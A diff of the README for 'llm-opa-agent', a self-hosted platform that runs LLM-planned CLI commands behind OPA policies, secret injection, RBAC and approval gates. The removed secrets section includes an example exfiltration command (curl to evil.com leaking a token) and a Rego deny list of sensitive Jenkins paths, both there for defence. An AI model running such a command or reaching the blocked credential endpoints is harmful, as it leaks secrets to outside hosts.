@@ -6,160 +6,81 @@
 
 ---
 
-A safe-to-use, local AI agent that turns natural-language prompts into CLI command sequences — with every command gated by an [OPA](https://www.openpolicyagent.org/) policy before execution.
+**From personal automation to governed agent infrastructure**
+
+---
 
 ## Table of contents
 
-- [Features](#features)
-- [How it works](#how-it-works)
-- [Getting started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-  - [Quick start](#quick-start)
-- [Skills](#skills)
-- [Secrets](#secrets)
-- [OPA policy](#opa-policy)
-- [Configuration](#configuration)
-- [User management](#user-management)
-- [API reference](#api-reference)
-- [Development](#development)
-- [Contributing](#contributing)
-- [NixOS / Nix dev shell](#nixos--nix-dev-shell)
-- [License](#license)
+1. [What it is](#what-it-is)
+2. [Why it exists](#why-it-exists)
+3. [How it differs from local agent tools](#how-it-differs-from-local-agent-tools)
+4. [Core concepts](#core-concepts)
+5. [Quick start](#quick-start)
+6. [Architecture](#architecture)
+7. [Security model / guardrails](#security-model--guardrails)
+8. [Roadmap](#roadmap)
+9. [Contributing](#contributing)
+10. [License](#license)
 
 ---
 
-## Features
+## What it is
 
-- **Natural-language task execution** — describe what you want in plain English; the agent figures out the commands
-- **Policy-gated execution** — every command is evaluated against a Rego policy before it runs; nothing executes without explicit permission
-- **Composable skills** — teach the agent new CLI tools by writing a short description; works with `kubectl`, `gh`, `terraform`, `docker`, or anything else you have installed
-- **Browser UI** — manage skills, trigger runs, and inspect execution history from a local web interface
-- **OpenAI-compatible** — works with OpenAI, Azure OpenAI, Ollama, or any compatible endpoint
-- **Fully local** — nothing leaves your machine except LLM API calls
+`llm-opa-agent` is a self-hosted platform that lets users drive CLI tools and infrastructure through natural language — with every generated command evaluated against an [Open Policy Agent](https://www.openpolicyagent.org/) (OPA) policy before it is executed.
 
----
+Unlike personal AI assistants, agents in `llm-opa-agent` are **centrally governed**: what tools exist, which commands are permitted, and which secrets can be used are all defined by administrators and enforced at the platform level — not left to individual users to configure on their machines.
 
-## How it works
+You describe a goal in plain text. The agent plans a sequence of commands, executes them one by one, observes the results, and repeats until the goal is reached or the policy blocks the next step. Everything is accessible through a browser UI with multi-user support, role-based access control, per-skill secret injection, and a full audit trail of every command ever run.
 
-Each run follows a tight plan → validate → execute loop:
-
-```
-prompt
-  └── Planner.next_action()       ← LLM decides: run command / done / failed
-        └── PolicyEvaluator.evaluate()    ← OPA allows or denies
-              └── CommandExecutor.run()   ← subprocess executes
-                    └── result appended to history → repeat
-```
-
-The agent keeps iterating until the goal is reached, it hits `MAX_ITERATIONS`, or the policy blocks a required command.
+Works with OpenAI, Azure OpenAI, [Ollama](https://ollama.com/), or any OpenAI-compatible endpoint.
 
 ---
 
-## Getting started
+## Why it exists
 
-### Prerequisites
+Personal AI tools are powerful, but they are designed for one person on one machine. The moment you want to:
 
-| Requirement | Notes |
-|---|---|
-| Python 3.12+ | |
-| OpenAI-compatible LLM endpoint | OpenAI, Azure OpenAI, [Ollama](https://ollama.com/), etc. |
-| CLI tools you want to use | Install them yourself with `brew`, `apt`, etc. |
+- let multiple teammates trigger agent runs against the same infrastructure,
+- guarantee that a generated command cannot delete production data or exfiltrate secrets,
+- schedule recurring agent tasks (nightly reports, health checks, automated triage),
+- or maintain a searchable audit log of everything the agent ever executed —
 
-### Installation
+…you need infrastructure, not just a local assistant.
 
-```sh
-# Clone the repository
-git clone <repo-url>
-cd llm-opa-agent
-
-# Install the package and dev dependencies
-pip install -e ".[dev]"
-
-# Copy and fill in the environment file
-cp .env.example .env
-```
-
-Open `.env` and set at minimum: `LLM_BASE_URL`, `LLM_API_KEY`, and `POLICY_PATH`.
-
-### Quick start
-
-```sh
-# Create a permissive dev policy (⚠️ do not use in production)
-echo 'package ops.agent\ndefault allow = true' > /tmp/dev-policy.rego
-
-# Point the agent at it
-echo 'POLICY_PATH=/tmp/dev-policy.rego' >> .env
-
-# Start the server
-uvicorn app.main:app --reload --port 8081
-```
-
-Open [http://localhost:8081](http://localhost:8081) in your browser.
+`llm-opa-agent` fills that gap: a governed, auditable, multi-user agent platform that you control and host yourself.
 
 ---
 
-## Skills
+## How it differs from local agent tools
 
-Skills tell the LLM which CLI tools are available and how to use them. Add and manage skills from the **Skills** tab in the UI.
+| Capability | Claude Desktop / local MCP | llm-opa-agent |
+|---|---|---|
+| Multi-user with roles | ✗ | ✓ admin + user roles |
+| Policy-gated execution | ✗ | ✓ OPA Rego, per-skill |
+| Per-skill secret injection | ✗ | ✓ secrets never enter LLM context |
+| Human approval gate | ✗ | ✓ per-user or global |
+| Scheduled tasks | ✗ | ✓ cron-based |
+| Audit trail | ✗ | ✓ full run history |
+| Shared skill library (Git) | ✗ | ✓ remote skill repository |
+| Self-hosted | sometimes | ✓ always |
 
-**Example skill — `kubectl`:**
+---
 
-```
-Name: kubectl
+## Core concepts
 
-Description:
-Kubernetes CLI. Use to inspect and manage cluster resources.
+### Skills
 
-Common patterns:
-- kubectl get pods -n <namespace>
-- kubectl logs <pod> -n <namespace>
-- kubectl describe deployment <name> -n <namespace>
-- kubectl rollout restart deployment/<name> -n <namespace>
+Skills tell the LLM which CLI tools are available and how to use them. Skills are defined by administrators, and should be tested before entering the "public" and be opened to users. 
+Each skill has a name, a plain-text description injected into the LLM prompt, an optional per-skill OPA policy, and an optional list of secret names to inject at execution time. Skills can be created and managed in the UI or loaded from a shared Git repository.
 
-Always specify -n <namespace>. Never delete resources unless explicitly asked.
-```
-
-Once a skill is saved and enabled, the agent can use it in any run. You can enable or disable individual skills per conversation.
-
-### Remote skill repository
-
-Instead of managing skills manually, you can load them from a public Git repository. Configure the repository URL and branch in the **Settings modal** (open via the gear icon in the UI) under the **Remote skill repository** section. The server will clone the repo and expose all top-level `.yaml` files as read-only skills.
-
-**Skill file format** — one `.yaml` file per skill at the root of the repository:
-
-```yaml
-name: kubectl
-description: |
-  Kubernetes CLI. Use to inspect and manage cluster resources.
-
-  Common patterns:
-  - kubectl get pods -n <namespace>
-  - kubectl logs <pod> -n <namespace>
-  - kubectl describe deployment <name> -n <namespace>
-  - kubectl rollout restart deployment/<name> -n <namespace>
-
-  Always specify -n <namespace>. Never delete resources unless explicitly asked.
-enabled: true
-policy: |
-  allow { input.argv[0] == "kubectl" }
-```
-
-**Minimal example** (name and description are the only required fields):
-
-```yaml
-name: curl
-description: |
-  Use curl to make HTTP requests. Prefer -s (silent) and -f (fail on error).
-  Always include -L to follow redirects.
-```
-
-**Example with a scoped policy** (only allow read-only kubectl subcommands):
+**Skill file format** (one `.yaml` per skill in a remote repository):
 
 ```yaml
 name: kubectl-readonly
 description: |
-  Read-only Kubernetes CLI access. Use only for read operations like get, describe, logs, top, version, and cluster-info.
+  Read-only Kubernetes CLI. Use get, describe, logs, top, version, cluster-info only.
+  Always specify -n <namespace>.
 enabled: true
 policy: |
   allowed := {"get", "describe", "logs", "top", "version", "cluster-info"}
@@ -169,144 +90,195 @@ policy: |
   }
 ```
 
-**Fields:**
-
 | Field | Required | Default | Description |
 |---|---|---|---|
 | `name` | yes | — | Tool name shown in the UI and injected into the LLM prompt |
-| `description` | yes | — | Full description of how the agent should use this tool |
+| `description` | yes | — | How the agent should use this tool |
 | `enabled` | no | `true` | Whether the skill is active by default |
 | `policy` | no | `null` | Rego rule bodies (no `package` line) that gate command execution |
-| `env` | no | `[]` | List of secret names injected into the subprocess at execution time |
+| `env` | no | `[]` | Secret names injected into the subprocess at execution time |
 
-Files in subdirectories are ignored — only top-level `.yaml` files are loaded.
+### OPA policy
 
-**Configuration:**
+Every command the agent wants to run is evaluated by OPA before execution. The policy receives `input.argv` — the command as a list of strings — and must return `allow = true` for the command to proceed. A global `.rego` file provides the baseline; individual skills can add further restrictions inline.
 
-Open the Skills & Settings modal → **Remote skill repository** section. Enter the repository URL and branch, then click **Save repo settings**. The server will immediately clone and sync the remote skills.
+### Runs
 
-Remote skills appear with a **remote** badge in the UI and cannot be edited or deleted from the interface. Use the **Sync remote skills** button to pull the latest changes without restarting the server.
+A run is a single agent session: one prompt, one plan→validate→execute loop, one result. Runs are persisted with their full command history and browsable from the UI. Follow-up messages in the same conversation create child runs that inherit skill overrides and model selection from the parent.
+
+### Scheduled tasks
+
+Any prompt can be turned into a scheduled task with a cron expression. The built-in scheduler fires the task in the background and records the result in the run history.
+
+### Secrets
+
+Secrets are stored in a local `secrets.json` file (never in `os.environ`, never in git). Each skill declares which secrets it needs via the `env` field. At execution time the resolved values are injected as environment variables into the subprocess only — the LLM only ever sees `${VAR_NAME}` placeholders, never actual values.
+
+### Users & roles
+
+Two roles: **admin** (full access: manage users, configure LLM endpoint, manage skills, set global approval, choose default model) and **user** (start runs, view history, toggle personal approval). The first admin account is bootstrapped from environment variables on first startup.
+
+### Approval gate
+
+When enabled (per-user or globally by an admin), the agent pauses before executing each command and waits for explicit approval in the UI. The user can approve or deny each step individually before it runs.
 
 ---
 
-## Secrets
+## Quick start
 
-Skills often need credentials (API tokens, passwords) to authenticate with external services. The agent supports **per-skill secret injection** that keeps credentials completely isolated from the LLM.
+### Prerequisites
 
-### How it works
+| Requirement | Notes |
+|---|---|
+| Python 3.12+ | |
+| OpenAI-compatible LLM endpoint | OpenAI, Azure OpenAI, [Ollama](https://ollama.com/), etc. |
+| CLI tools you want to use | Install them with `brew`, `apt`, etc. |
 
-1. Secrets are stored in `secrets.json` (never in process environment, never in git)
-2. Each skill declares which secrets it needs via the `env` field (a list of names)
-3. At execution time, the matched skill's secrets are resolved from the store and:
-   - Injected as environment variables into the subprocess
-   - Used to resolve `${VAR_NAME}` placeholders in the command arguments
-4. The LLM only ever sees the `${VAR_NAME}` placeholder — never the actual value
-
-### Security guarantees
-
-- **Secrets never enter `os.environ`** — even if a misconfigured skill allows `printenv` or `env`, nothing sensitive is exposed
-- **Per-skill scoping** — a skill can only access secrets listed in its own `env` field
-- **OPA policy is the guard** — the policy should restrict target domains to prevent exfiltration (e.g., `curl https://evil.com/?leak=${TOKEN}`)
-- **No API exposure** — secrets are managed via file only, not through the web UI or API
-
-### Setup
-
-Create `secrets.json` in the project root (it is gitignored automatically):
-
-```json
-{
-  "JENKINS_TOKEN": "your-actual-token",
-  "GITHUB_TOKEN": "ghp_xxxxxxxxxxxx"
-}
-```
-
-Set file permissions to restrict access:
+### Installation
 
 ```sh
-chmod 600 secrets.json
+git clone <repo-url>
+cd llm-opa-agent
+
+pip install -e ".[dev]"
+
+cp .env.example .env
+# Set LLM_BASE_URL, LLM_API_KEY, POLICY_PATH, ADMIN_PASSWORD
 ```
 
-### Using secrets in a skill
+### Start the server
 
-Reference secret names in the skill's `env` field:
+```sh
+# Create a permissive dev policy (⚠ do not use in production)
+echo 'package ops.agent\ndefault allow = true' > /tmp/dev-policy.rego
+echo 'POLICY_PATH=/tmp/dev-policy.rego' >> .env
 
-```yaml
-name: jenkins-api
-description: |
-  Jenkins REST API access (read-only).
-  Environment variables available: ${JENKINS_TOKEN}.
-  Use ${VAR} syntax in arguments — values are injected at runtime.
-  Use --user agent:${JENKINS_TOKEN} for authentication.
-enabled: true
-env:
-  - JENKINS_TOKEN
-policy: |
-  argv_has(v) { input.argv[_] == v }
-  url_allowed {
-    val := input.argv[_]
-    contains(val, "my.jenkins.com")
-    not url_blocked(val)
-  }
-  url_blocked(val) { contains(val, "/credentials") }
-  url_blocked(val) { contains(val, "/script") }
-  url_blocked(val) { contains(val, "/config.xml") }
-  url_blocked(val) { contains(val, "/systemInfo") }
-  url_blocked(val) { contains(val, "/configure") }
-  url_blocked(val) { contains(val, "/env-vars") }
-  allow {
-    input.argv[0] == "curl"
-    argv_has("-k")
-    argv_has("-X")
-    argv_has("GET")
-    url_allowed
-  }
+uvicorn app.main:app --reload --port 8081
 ```
 
-### What the LLM sees vs what actually runs
+Open [http://localhost:8081](http://localhost:8081) and log in with the admin credentials from `.env`.
 
-| Stage | Content |
-|---|---|
-| **LLM generates** | `["curl", "-k", "-X", "GET", "--user", "agent:${JENKINS_TOKEN}", "https://corp.jenkins.com/api/json"]` |
-| **Stored in history** | Same as above (placeholder only) |
-| **Subprocess receives** | `curl -k -X GET --user username:actual-secret-value https://copr.jenkins.com/api/json` |
+### Nix / NixOS
 
-The actual secret value exists only in the subprocess environment — never in LLM context, conversation history, or logs.
+```sh
+nix develop    # sets up Python 3.12, uv, Node 22, and LD_LIBRARY_PATH for regopy
+uv run uvicorn app.main:app --reload --port 8081
+```
+
+The `flake.nix` ships `python312`, `uv`, `nodejs_22`, and `gcc.cc.lib` (needed by `regopy`'s bundled native `.so`). On shell entry, `uv sync` creates `.venv` and installs all Python dependencies automatically.
+
+### Frontend development
+
+```sh
+cd frontend
+npm install
+npm run dev    # dev server on :5173, proxies /api/* to :8081
+```
+
+Build for production: `cd frontend && npm run build` — output goes to `app/static/`, served by FastAPI at `/`.
 
 ---
 
-## OPA policy
+## Architecture
 
-The agent **will not execute any command** unless the policy returns `allow = true`. Point `POLICY_PATH` to a `.rego` file to control what the agent is allowed to do.
+### Request flow
 
-**Allow-all (development only):**
-
-```rego
-package ops.agent
-
-default allow = true
+```
+prompt
+  └── Planner.next_action()           ← LLM decides: run command / done / failed
+        └── PolicyEvaluator.evaluate()    ← OPA allows or denies
+              └── CommandExecutor.run()       ← subprocess executes
+                    └── result appended to history → repeat
 ```
 
-**Read-only `kubectl` (production example):**
+The loop runs up to `MAX_ITERATIONS` times. The agent stops when the LLM signals `done` or `failed`, or when a required command is denied by the policy.
+
+### Components
+
+| Component | Role |
+|---|---|
+| `AgentWorkflow` | Orchestrates the plan→validate→execute loop |
+| `Planner` | Calls the LLM; returns the next `Command` or a terminal action |
+| `PolicyEvaluator` | Evaluates the command against OPA (in-process via `regopy`) |
+| `CommandExecutor` | Runs the command as a subprocess; injects secrets |
+| FastAPI (`app/main.py`) | HTTP API, static file serving, scheduler |
+| React + Vite (`frontend/`) | Browser UI |
+
+### Persistence
+
+By default everything is stored as JSON files on disk. When `MONGODB_URI` is set, the application switches to a MongoDB backend automatically.
+
+| File | Contents |
+|---|---|
+| `skills.json` | Local skill definitions |
+| `runs.json` | Run history |
+| `users.json` | User accounts (bcrypt-hashed passwords) |
+| `secrets.json` | Credential store (`chmod 600`, gitignored) |
+| `settings.json` | App settings (LLM endpoint, available models, approval flag) |
+| `scheduled_tasks.json` | Cron task definitions |
+
+### Remote skill repository
+
+Skills can be loaded from a Git repository. Configure the URL and branch via **Settings → Remote skill repository**. The server clones the repo and exposes top-level `.yaml` files as read-only skills (remote badge in the UI). Use the **Sync remote skills** button to pull the latest changes without restarting.
+
+---
+
+## Security model / guardrails
+
+### OPA policy is the execution gate
+
+No command executes without an explicit `allow = true` from OPA. The policy is evaluated in-process with no network round-trip.
 
 ```rego
 package ops.agent
 
 default allow = false
 
-allowed_prefixes := [
-  ["kubectl", "get"],
-  ["kubectl", "describe"],
-  ["kubectl", "logs"],
-]
-
 allow {
-  some prefix
-  prefix := allowed_prefixes[_]
-  array.slice(input.argv, 0, count(prefix)) == prefix
+  input.argv[0] == "kubectl"
+  {"get", "describe", "logs"}[input.argv[1]]
 }
 ```
 
-The policy receives `input.argv` — the proposed command as a list of strings. You can inspect any other property of the command from within Rego as needed.
+Each skill can additionally ship its own Rego rules that are merged with the global policy. A `kubectl-readonly` skill cannot be used to trigger `kubectl delete` even if the global policy is permissive.
+
+### Secret isolation
+
+Secrets are injected at subprocess level only. They are never stored in `os.environ`, never logged, never visible in run history, and never sent to the LLM. The LLM and run history only ever see `${VAR_NAME}` placeholders.
+
+```json
+// secrets.json (chmod 600, gitignored)
+{
+  "GITHUB_TOKEN": "ghp_xxxxxxxxxxxx"
+}
+```
+
+```yaml
+# skill: gh
+env:
+  - GITHUB_TOKEN
+```
+
+| Stage | What is visible |
+|---|---|
+| LLM generates | `["curl", "--header", "Authorization: Bearer ${GITHUB_TOKEN}", "..."]` |
+| Stored in history | Same — placeholder only |
+| Subprocess receives | Actual token value as environment variable |
+
+### Approval gate
+
+Per-user and global approval flags provide human-in-the-loop oversight. When enabled, the agent pauses before each command and waits for an explicit approve or deny in the UI.
+
+### Authentication & authorisation
+
+- JWT-based authentication (configurable via `JWT_SECRET`)
+- Two-role RBAC (admin / user)
+- Admin-only endpoints: user management, LLM configuration, skill management, global approval flag
+- Bootstrap credentials are set via environment variables; the admin password should be rotated on first login
+
+### Audit trail
+
+Every run is persisted with its full command history, timestamps, originating prompt, and final status. The run history is browsable via the UI and queryable via the API.
 
 ---
 
@@ -316,186 +288,48 @@ The policy receives `input.argv` — the proposed command as a list of strings. 
 |---|---|---|---|
 | `LLM_BASE_URL` | yes | — | Base URL of the OpenAI-compatible API |
 | `LLM_API_KEY` | yes | — | API key |
-| `LLM_MODEL` | no | `gpt-4.1` | Model name |
+| `LLM_MODEL` | no | `gpt-4.1` | Default model name |
 | `POLICY_PATH` | yes | — | Absolute path to a `.rego` policy file |
-| `MAX_ITERATIONS` | no | `10` | Maximum plan → validate → execute cycles per run |
-| `SKILLS_FILE` | no | `./skills.json` | Path where skills are persisted |
-| `RUNS_FILE` | no | `./runs.json` | Path where run history is persisted |
-| `SECRETS_FILE` | no | `./secrets.json` | Path to the secrets store (JSON, chmod 600) |
+| `MAX_ITERATIONS` | no | `10` | Maximum plan→validate→execute cycles per run |
 | `COMMAND_TIMEOUT_SECONDS` | no | `30` | Seconds before a running command is killed |
+| `ADMIN_USERNAME` | no | `admin` | Bootstrap admin username |
+| `ADMIN_PASSWORD` | no | — | Bootstrap admin password (set this!) |
+| `JWT_SECRET` | no | `change-me-in-production` | JWT signing secret |
+| `MONGODB_URI` | no | — | MongoDB connection string (enables MongoDB backend) |
+| `SKILLS_FILE` | no | `./skills.json` | Path to local skill store |
+| `RUNS_FILE` | no | `./runs.json` | Path to run history |
+| `SECRETS_FILE` | no | `./secrets.json` | Path to secrets store |
 
-> **Remote skill repository** is now configured via the UI (Settings modal → Remote skill repository), not via environment variables.
-
----
-
-## User management
-
-The agent has a built-in multi-user system with two roles: **admin** and **user**.
-
-### Roles
-
-| Role | What they can do |
-|---|---|
-| `admin` | Full access: manage users, configure LLM endpoint and API key, manage skills (create / edit / delete), configure the remote skill repository, set the global approval flag, choose the default model |
-| `user` | Start runs, view conversation history, view the skills list (read-only), toggle their own per-user approval setting |
-
-### Bootstrap
-
-The first admin account is created automatically on startup when the users file is empty, using the credentials from the environment:
-
-```env
-ADMIN_USERNAME=admin
-ADMIN_PASSWORD=changeme
-```
-
-Change the password immediately after the first login.
-
-### Managing users
-
-Admins see a **👥** button in the bottom-left of the sidebar. This opens the **User Management** modal where you can:
-
-- Create new users (username, password, role)
-- Delete existing users (you cannot delete your own account)
-
-### User settings
-
-Each user has a personal **Require approval before each command** toggle, accessible via the gear (⚙) icon in the sidebar. When enabled, the agent pauses before executing each command and waits for the user to approve or deny it in the UI.
-
-This setting is per-user and persisted independently for each account. It can be changed at any time without affecting other users.
-
-### Global approval override
-
-Admins can also set a **global** approval requirement via the same Settings modal. When the global flag is on, every user's runs require approval regardless of their personal setting. A notice is shown in the user's settings modal when the admin has enforced this:
-
-> ℹ️ Approval is also enforced globally by your administrator.
-
-### Password change
-
-Any user can change their own password via **Settings → Change password** (accessible from the user menu in the sidebar).
+The remote skill repository is configured via the UI (Settings modal → Remote skill repository), not via environment variables.
 
 ---
 
-## API reference
+## Roadmap
 
-| Method | Path | Description |
-|---|---|---|
-| `POST` | `/api/agent/run` | Start a run. Body: `{"prompt": "..."}` |
-| `GET` | `/api/agent/runs` | List all runs |
-| `GET` | `/api/agent/runs/{run_id}` | Get run status and execution history |
-| `GET` | `/api/skills` | List all skills (local + remote) |
-| `POST` | `/api/skills` | Create a local skill |
-| `PATCH` | `/api/skills/{id}` | Update a local skill |
-| `DELETE` | `/api/skills/{id}` | Delete a local skill |
-| `POST` | `/api/skills/sync` | Pull latest skills from the remote Git repo |
-| `GET` | `/health` | Health check |
-
----
-
-## Development
-
-### Backend
-
-```sh
-# Install Python dependencies (incl. dev extras)
-pip install -e ".[dev]"
-
-# Start the API server with auto-reload
-uvicorn app.main:app --reload --port 8081
-```
-
-### Frontend
-
-The UI lives in [`frontend/`](frontend/) and is built with [Vite](https://vite.dev/) + React.
-
-```sh
-cd frontend
-
-# Install Node dependencies (first time only)
-npm install
-
-# Start the dev server with hot-module reload
-# Proxies /api/* to the backend on :8081
-npm run dev
-```
-
-Open [http://localhost:5173](http://localhost:5173) for the dev frontend (or [http://localhost:8081](http://localhost:8081) to use the last production build served by FastAPI).
-
-### Building the frontend for production
-
-```sh
-cd frontend && npm run build
-```
-
-This outputs the compiled assets to `app/static/`, which FastAPI serves at `/`.
-
-### Tests
-
-**Backend (Python):**
-
-```sh
-pytest
-```
-
-The test suite lives in [`tests/`](tests/) and uses `pytest` with `pytest-asyncio`. Contributions should include tests for any new behaviour.
-
-**Frontend (JavaScript):**
-
-```sh
-cd frontend && npm run test
-```
-
-Frontend tests use [Vitest](https://vitest.dev/) with [Testing Library](https://testing-library.com/). They live in [`frontend/src/`](frontend/src/) alongside the components they cover.
+- **Per-chat model selection** — choose the LLM model per conversation instead of a single global default; admins configure the available model list via the Settings modal
+- **Kubernetes deployment** — reference Helm chart and RBAC manifests for running the agent inside a cluster (see [`sample-k8s-agent.yaml`](sample-k8s-agent.yaml) for an early example)
+- **MongoDB backend** — production-grade persistence for all stores (partially implemented; enabled via `MONGODB_URI`)
+- **Webhook triggers** — allow external systems (CI pipelines, alerting tools) to trigger agent runs via signed webhooks
+- **Structured skill marketplace** — publish and subscribe to versioned skill packages from a registry
 
 ---
 
 ## Contributing
 
-Contributions are welcome! Here's how to get involved:
+Contributions are welcome.
 
-1. **Fork** the repository and create a feature branch (`git checkout -b feat/my-feature`)
-2. **Make your changes** — keep the scope focused and include tests
-3. **Run the test suites** (`pytest` and `cd frontend && npm run test`) and make sure everything passes
-4. **Open a pull request** with a clear description of what you changed and why
+1. **Fork** the repository and create a feature branch: `git checkout -b feat/my-feature`
+2. **Make your changes** — keep the scope focused; open an issue first for significant changes
+3. **Run the test suites** and make sure everything passes:
 
-For significant changes, please open an issue first to discuss the approach.
+   ```sh
+   pytest                        # backend
+   cd frontend && npm run test   # frontend
+   ```
 
----
+4. **Open a pull request** with a clear description of what changed and why
 
-## NixOS / Nix dev shell
-
-The repository ships a `flake.nix` for reproducible development on NixOS (or any system with Nix flakes enabled).
-
-### What the flake provides
-
-| Package | Purpose |
-|---|---|
-| `python312` | Python 3.12 runtime (matches `requires-python = ">=3.12"`) |
-| `uv` | Python package manager — installs deps from `uv.lock` into `.venv` |
-| `nodejs_22` | Node.js for the React/Vite frontend |
-| `gcc.cc.lib` | GCC runtime libs — required by `regopy`'s bundled native `.so` (`libatomic.so.1`) |
-
-On shell entry, `uv sync` automatically creates `.venv` and installs all Python dependencies.
-
-### Enter the dev shell
-
-```sh
-nix develop
-```
-
-### Start the backend
-
-```sh
-uv run uvicorn app.main:app --reload --port 8081
-```
-
-`uvicorn` is not on `PATH` directly — use `uv run` to invoke it from the managed `.venv`.
-
-### Notes
-
-- **`libatomic` on Linux/NixOS** — `regopy` ships a pre-built shared library that links against `libatomic.so.1`. On Linux systems such as NixOS, the flake sets `LD_LIBRARY_PATH` to point at `gcc.cc.lib` so the dynamic linker can find it.
-- **macOS** — `LD_LIBRARY_PATH` is not used in the same way on macOS, and the extra GCC runtime library may be unnecessary there.
-- **Python downloads disabled** — `UV_PYTHON_DOWNLOADS=never` and `UV_PYTHON` are set in the shell hook so `uv` always uses the Nix-provided Python and never attempts to download its own.
-- **`.env` file** — still required; the flake does not create it. See [Installation](#installation).
+The backend test suite lives in [`tests/`](tests/) and uses `pytest` with `pytest-asyncio`. Frontend tests use [Vitest](https://vitest.dev/) with [Testing Library](https://testing-library.com/) and live alongside the components in [`frontend/src/`](frontend/src/).
 
 ---
 
